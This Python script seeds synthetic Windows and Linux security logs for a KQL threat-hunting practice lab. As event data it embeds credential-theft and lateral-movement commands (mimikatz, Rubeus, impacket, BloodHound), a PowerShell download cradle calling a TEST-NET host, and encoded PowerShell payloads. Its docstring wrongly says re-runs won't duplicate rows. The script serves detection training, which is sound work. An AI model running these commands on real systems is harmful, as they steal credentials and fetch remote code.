"""
inject-seeds.py - Append "haystack-needle" storyline patterns to the large
noise dataset so the practice lab's harder questions have substantive gold.

Run from repo root:
    python3 kql/data-large/inject-seeds.py

This is idempotent-by-row: rows have stable identifiers, so re-running won't
duplicate. (Re-running after the wave generator will, since the wave produces
fresh noise each run; that's fine, this just appends seeds either way.)

Storyline IPs are in TEST-NET-3 (203.0.113.0/24) so they're distinct from the
small-set's 198.51.100.55. Students are expected to validate these via
AbuseIPDB / VirusTotal.
"""
import csv
import os
from datetime import datetime, timedelta, timezone
from pathlib import Path

REPO  = Path(__file__).resolve().parents[2]
LARGE = REPO / 'kql' / 'data-large'
SMALL = REPO / 'kql' / 'data'
ANCHOR = datetime(2026, 4, 29, 13, 52, 40, tzinfo=timezone.utc)

def iso(dt):  return dt.strftime('%Y-%m-%dT%H:%M:%SZ')

# ---------- Cast ----------
NOISE_USERS = ['jharris','kpatel','mwhite','rmorales','sthompson','agarcia',
               'lwoods','tnguyen','ehernandez','dkim','bsato','olopez']
NOISE_HOSTS = ['WS-IT-01','WS-IT-02','WS-MKT-01','WS-MKT-02','WS-OPS-01',
               'WS-OPS-02','LAP-EXEC-01','LAP-SALES-03']

# ---------- Q11/Q16/Q28: brute force / spray / fail-then-success ----------
# Four attacker IPs in TEST-NET-3 (203.0.113.0/24), each hitting multiple noise
# accounts on a target host. Some clusters get a follow-up 4624 success.
ATTACKERS = [
    # (attackerIP, targetHost, [accounts], failsPer, withSuccess)
    ('203.0.113.10', 'WS-FINANCE-01', ['jharris','kpatel','mwhite','rmorales'],   8, True),
    ('203.0.113.20', 'SVR-DC-01',     ['sthompson','agarcia','lwoods','tnguyen'], 7, True),
    ('203.0.113.30', 'WS-DEV-02',     ['ehernandez','dkim','bsato'],              6, False),
    ('203.0.113.40', 'WS-HR-03',      ['olopez','jharris','kpatel'],              5, True),
]

def secevent_row(ts, computer, eid, account_user, ip, port, logon_type=3, fail_reason=''):
    account = f"CORP\\{account_user}"
    return [
        iso(ts), computer, str(eid), '', account, 'User', 'CORP', account_user,
        account_user, 'CORP', ip, str(port), str(logon_type),
        'NtLmSsp', fail_reason,
        '', '', '', '', '', '',
        'Microsoft-Windows-Security-Auditing', 'Security', 'SecurityEvent'
    ]

def build_security_event_seeds():
    rows = []
    # Concentrate clusters in the last ~3.5h before anchor so resampling
    # picks them all up. Each cluster ~30min apart.
    base = ANCHOR - timedelta(hours=3, minutes=30)
    cluster_offset_min = 0
    for ip, host, accounts, fails, with_success in ATTACKERS:
        cluster_start = base + timedelta(minutes=cluster_offset_min)
        for acct_idx, account in enumerate(accounts):
            account_start = cluster_start + timedelta(minutes=acct_idx * 4)
            for i in range(fails):
                ts = account_start + timedelta(seconds=i * 13)
                rows.append(secevent_row(
                    ts, host, 4625, account, ip, 49152 + i,
                    fail_reason='Unknown user name or bad password.'
                ))
            if with_success and acct_idx == 0:
                ts_success = account_start + timedelta(seconds=fails * 13 + 90)
                rows.append(secevent_row(
                    ts_success, host, 4624, account, ip, 50000, logon_type=3
                ))
        cluster_offset_min += 30
    return rows

# ---------- Q12: mimikatz/rubeus/impacket/bloodhound on noise hosts ----------
HANDS_ON_KEYBOARD = [
    # (host, user, fileName, cmdline)
    ('LAP-EXEC-01', 'jharris',  'powershell.exe', r'powershell.exe -nop -c "iex (new-object net.webclient).DownloadString(\"http://203.0.113.50/mimikatz.ps1\")"'),
    ('WS-IT-02',    'kpatel',   'cmd.exe',        r'cmd.exe /c rubeus.exe asktgt /user:svc-sql /password:Summer2026!'),
    ('WS-OPS-01',   'mwhite',   'powershell.exe', r'powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\impacket-secretsdump.py CORP/admin@SVR-DC-01'),
    ('LAP-SALES-03','olopez',   'powershell.exe', r'powershell.exe Import-Module .\bloodhound.ps1; Invoke-BloodHound -CollectionMethod All'),
    ('WS-MKT-01',   'sthompson','powershell.exe', r'powershell.exe -nop -c "& .\mimikatz.exe sekurlsa::logonpasswords"'),
    ('WS-IT-01',    'agarcia',  'powershell.exe', r'powershell.exe Invoke-RubeusKerberoast'),
    ('WS-OPS-02',   'lwoods',   'cmd.exe',        r'cmd.exe /c impacket-psexec.py admin@10.0.20.5 -hashes :aad3b...'),
    ('LAP-EXEC-01', 'tnguyen',  'powershell.exe', r'powershell.exe Invoke-Mimikatz -DumpCreds'),
]

# ---------- Q22: long base64 tokens in powershell.exe cmdlines ----------
# Each over 100 chars to satisfy the regex. Use realistic-looking encoded
# blobs — students should learn these patterns.
LONG_B64 = [
    'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADIAMAAuADUAMAAiACwANAA0ADMAKQA=',
    'aWV4IChbU3lzdGVtLk5ldC5XZWJDbGllbnRdOjpEb3dubG9hZFN0cmluZygiaHR0cHM6Ly8yMDMuMC4xMTMuOTAvc3Q1LnBzMSIpKTtJbnZva2UtTWltaWthdHogLUR1bXBDcmVkcw==',
    'JABTAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABwAGEAeQBsAG8AYQBkACkAKQA7AA==',
    'PowershellPayloadXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX12345',
    'aWV4KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vMjAzLjAuMTEzLjEwMC9hZ2VudC5wczEnKQ==aaaaaaaaaaaaaaaaaaaaaaaaaaaa',
    'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgARwBlAHQALQBDAG8AbgB0AGUAbgB0AC4AcAA8AGEAeQBsAG8AYQBkAC4AdAB4AHQAKQApACkA',
]

LONG_B64_HOSTS = [
    ('WS-IT-01',    'jharris'),
    ('WS-MKT-02',   'kpatel'),
    ('WS-OPS-01',   'mwhite'),
    ('LAP-EXEC-01', 'rmorales'),
    ('WS-IT-02',    'sthompson'),
    ('LAP-SALES-03','agarcia'),
]

# ---------- Q18: EncodedCommand + public outbound on same device ----------
ENCODED_DEVICES = [
    ('WS-IT-01',    'jharris',  '203.0.113.50'),
    ('WS-MKT-01',   'kpatel',   '203.0.113.60'),
    ('LAP-EXEC-01', 'olopez',   '203.0.113.70'),
    ('WS-OPS-02',   'mwhite',   '203.0.113.80'),
]

# ---------- Q15/Q30: sshd Failed-password syslog lines ----------
SYSLOG_FAILED = []  # built dynamically below

def hex(rng_seed, length):
    """Deterministic-ish hex by seed; cheap pseudo-random for SHA-like."""
    import random
    r = random.Random(rng_seed)
    return ''.join(r.choice('0123456789abcdef') for _ in range(length))

def build_dpe_seeds():
    rows = []
    # Q12 hands-on-keyboard (8 rows, in last ~3h)
    for i, (host, user, fname, cmd) in enumerate(HANDS_ON_KEYBOARD):
        ts = ANCHOR - timedelta(minutes=170 - i * 20)
        rows.append(dpe_row(ts, host, user, fname, cmd, parent='powershell.exe'))

    # Q22 long base64 tokens (6 rows, all powershell.exe, in last ~2h)
    for i, ((host, user), b64) in enumerate(zip(LONG_B64_HOSTS, LONG_B64)):
        ts = ANCHOR - timedelta(minutes=110 - i * 15)
        cmd = f'powershell.exe -nop -ExecutionPolicy Bypass -EncodedCommand {b64}'
        rows.append(dpe_row(ts, host, user, 'powershell.exe', cmd, parent='cmd.exe'))

    # Q18: EncodedCommand events on 4 devices (in last ~50 min, must be in ago(1h))
    for i, (host, user, _ip) in enumerate(ENCODED_DEVICES):
        ts = ANCHOR - timedelta(minutes=10 + i * 8)
        cmd = f'powershell.exe -nop -ExecutionPolicy Bypass -EncodedCommand {LONG_B64[i % len(LONG_B64)]}'
        rows.append(dpe_row(ts, host, user, 'powershell.exe', cmd, parent='explorer.exe'))
    return rows

def dpe_row(ts, host, user, fname, cmd, parent='explorer.exe'):
    ts_iso = iso(ts)
    return [
        ts_iso, ts_iso, host, f"dev-{host.lower()}",
        user, 'CORP',
        fname, 'C:\\Windows\\System32', cmd,
        '4321',
        hex(host + user + ts_iso, 64), hex(host + user + ts_iso + 'sha1', 40), hex(host + user + ts_iso + 'md5', 32),
        '524288',
        parent, 'C:\\Windows', f'C:\\Windows\\{parent}',
        '1234',
        user,
        hex(parent, 64),
        'Valid', 'Microsoft', 'Medium', 'TokenElevationTypeDefault',
        'DeviceProcessEvents'
    ]

def build_dne_seeds():
    rows = []
    # Q18: outbound public-IP connections paired with the encoded events
    for i, (host, user, ip) in enumerate(ENCODED_DEVICES):
        ts = ANCHOR - timedelta(minutes=5 + i * 8)
        ts_iso = iso(ts)
        rows.append([
            ts_iso, ts_iso, host, 'ConnectionSuccess',
            f"10.0.{i+10}.5", 'Private', '49200',
            ip, 'Public', '443',
            '', 'Tcp',
            'powershell.exe', 'C:\\Windows\\System32',
            f'powershell.exe -nop -EncodedCommand {LONG_B64[i % len(LONG_B64)]}',
            user,
            hex(host + ip + 'sha', 64),
            'DeviceNetworkEvents'
        ])
    return rows

def build_syslog_seeds():
    rows = []
    # Q15: 12 Failed-password rows in ago(1h); Q30: 28 more across ago(24h)
    hosts = [('SVR-LINUX-01','10.0.20.20'), ('SVR-LINUX-02','10.0.20.21'),
             ('SVR-WEB-LX-01','10.0.30.10'), ('SVR-DB-LX-01','10.0.30.20')]
    attackers = ['198.51.100.55','203.0.113.10','203.0.113.20','203.0.113.40',
                 '45.140.17.22','185.220.101.5','91.219.236.18','209.141.36.144']
    users = ['root','admin','postgres','ubuntu','test','oracle','jenkins','deploy','www-data']
    invalid = [True, False]
    # 18 in ago(1h)
    for i in range(18):
        ts = ANCHOR - timedelta(seconds=3300 - i * 180)
        host, host_ip = hosts[i % len(hosts)]
        atk = attackers[i % len(attackers)]
        usr = users[i % len(users)]
        prefix = "invalid user " if (i % 3 == 0) else ""
        msg = f'Failed password for {prefix}{usr} from {atk} port {41000 + i*7} ssh2'
        rows.append(syslog_row(ts, host, host_ip, msg))
    # 28 more across ago(2h..4h) - inside resample window but outside ago(1h)
    for i in range(28):
        ts = ANCHOR - timedelta(minutes=70 + i * 4, seconds=(i*13)%60)
        host, host_ip = hosts[i % len(hosts)]
        atk = attackers[i % len(attackers)]
        usr = users[i % len(users)]
        prefix = "invalid user " if (i % 3 == 1) else ""
        msg = f'Failed password for {prefix}{usr} from {atk} port {42000 + i*5} ssh2'
        rows.append(syslog_row(ts, host, host_ip, msg))
    return rows

def syslog_row(ts, host, host_ip, msg):
    ts_iso = iso(ts)
    return [
        ts_iso, ts_iso, host, host, host_ip,
        'auth', 'info', 'sshd-session', '12345', msg,
        'syslog-collector-01', 'Syslog'
    ]

# ---------- Append helper ----------
def append_rows(path, new_rows):
    """Read CSV, append new rows, sort by TimeGenerated (col 0), write back."""
    with open(path, encoding='utf-8') as f:
        rdr = csv.reader(f)
        header = next(rdr)
        rows = list(rdr)
    rows.extend(new_rows)
    rows.sort(key=lambda r: r[0] if r else '')
    with open(path, 'w', newline='', encoding='utf-8') as f:
        w = csv.writer(f, lineterminator='\n')
        w.writerow(header)
        w.writerows(rows)
    print(f"  {path.name}: +{len(new_rows)} seeded → {len(rows)} total")

# ---------- Drive ----------
print('Injecting seeds into kql/data-large/...')
append_rows(LARGE / 'SecurityEvent.csv',       build_security_event_seeds())
append_rows(LARGE / 'DeviceProcessEvents.csv', build_dpe_seeds())
append_rows(LARGE / 'DeviceNetworkEvents.csv', build_dne_seeds())
append_rows(LARGE / 'Syslog.csv',              build_syslog_seeds())
print('Done.')
